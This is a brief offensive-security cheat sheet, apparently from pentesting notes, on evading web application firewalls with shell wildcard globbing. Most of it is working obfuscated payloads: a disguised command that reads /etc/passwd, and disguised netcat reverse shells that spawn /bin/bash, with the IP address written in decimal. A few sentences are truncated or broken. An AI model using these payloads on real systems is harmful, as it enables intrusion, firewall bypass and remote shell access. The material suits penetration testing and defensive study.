## Evading WAF

Instead executing

`ls`

command, you can use the following syntax:

`/???/?s`



Standard:`/bin/cat /etc/passwd`  
Evasion:`/???/??t /???/??ss??`



\(usually`nc -e /bin/bash 127.0.0.1 1337`\), you can do it with a syntax like:

`/???/n? -e /???/b??h 2130706433 1337`

If  use`nc.traditional`instead of`nc`that doesn’t have the`-e`parameter in order to execute`/bin/bash`after connect. The payload become something like this:

```
/???/?c.??????????? -e /???/b??h 2130706433 1337
```

### References

[https://medium.com/secjuice/waf-evasion-techniques-718026d693d8](https://medium.com/secjuice/waf-evasion-techniques-718026d693d8)

[https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)

